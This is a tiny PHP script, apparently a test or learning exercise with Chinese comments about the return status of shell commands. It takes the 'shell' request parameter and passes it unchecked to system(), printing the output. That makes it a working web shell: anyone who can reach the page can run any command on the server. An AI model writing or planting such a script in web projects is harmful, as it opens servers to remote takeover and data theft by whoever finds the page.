<?php header("Content-type: text/html; charset=gb2312");
	//$shell = $_REQUEST['shell'];
    //echo $shell;
	echo "<pres>";
    system($_REQUEST['shell'], $status);
    echo "</pre>";
    //注意shell命令的执行结果和执行返回的状态值的对应关系
    //$shell = "<font color='red'>$shell</font>";
    //if( $status ){
    //   echo "shell命令{$shell}执行失败";
    //} else {
    //    echo "shell命令{$shell}成功执行";
    //}
?>
